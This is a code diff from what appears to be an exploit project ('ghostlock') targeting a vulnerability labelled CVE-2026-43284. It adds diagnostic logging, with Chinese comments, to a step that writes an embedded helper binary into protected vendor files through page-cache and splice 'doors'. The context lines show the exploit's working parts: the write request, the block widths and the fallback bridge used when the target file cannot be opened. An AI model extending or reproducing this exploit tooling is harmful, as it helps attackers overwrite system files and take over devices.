@@ -5,6 +5,7 @@
  *  the access in.
  */
 #include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
+#include "jni/gl_log.hpp"
 #include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"
 #include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
 #include "backend/cve_2026_43284/landing/encap_peer.hpp"
@@ -80,6 +81,13 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             old_page = bridge.old_page();
             helper = bridge.helper();
         }
+        /* 本次装配的来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:70-82
+         *  —— 那边的写来源是 file_fd，App 打不开 vendor 文件时改用 patch #1 写下的 helper 桥；
+         *  :129-167 的读同理。这里把这次装配的门、fd 与来源报出来，逐块的 fd 见窗口层）。 */
+        GL_LOGI("runner: door=%s target_fd=%d bridge=%d encap_port=%u sa_set=%d width=%zu",
+                context.door_path, target_fd, target_fd < 0 ? 1 : 0,
+                static_cast<unsigned>(context.params->sa.encap_port),
+                context.params->sa.set ? 1 : 0, landing::kWriteWidth);
         landing::RemoteDoor remote_door(door);
         landing::DoorOps &doors = target_fd < 0 ? static_cast<landing::DoorOps &>(remote_door)
                                              : static_cast<landing::DoorOps &>(door);
@@ -108,6 +116,12 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                         embed::splicehelper_padded_size());
                 request.offset = 0U;
                 request.width = 16U;
+                /* patch #1 的镜像与来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:19-50
+                 *  —— 那边 patch #1 = 内嵌 helper 按 kCrashDumpBlockBytes 逐块写进目标，offset 从 0 起）。 */
+                GL_LOGI("patch1: image=%zu offset=%llu width=%zu blocks=%zu source_fd=%d bridge=%d",
+                        request.image.size(), static_cast<unsigned long long>(request.offset), request.width,
+                        (request.image.size() + request.width - 1U) / request.width, target_fd,
+                        target_fd < 0 ? 1 : 0);
                 ran = write_image_verified(request, &body_refusal);
                 if (!ran && body_refusal != nullptr) {
                     /* 写入失败时把 splice 的失败码接在拒绝名后面：设备上就靠这个数。 */
@@ -154,6 +168,11 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 ran = body_refusal == nullptr;
                 break;
         }
+        /* 这一步的结果（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:44-50
+         *  —— 那边的判据就是每块 write16 的返回码；组帧层的失败码另见 pagecache_write.hpp last_error）。 */
+        GL_LOGI("runner: step=%s outcome=%s refusal=%s splice_error=%d",
+                pagecache_step_name(step), ran ? "ran" : "refused",
+                body_refusal != nullptr ? body_refusal : "(null)", window.last_error());
         static_cast<void>(access.shutdown());
         if (ran) { return StepOutcome::Ran; }
         *refusal = body_refusal == nullptr ? kWriteRefused : body_refusal;
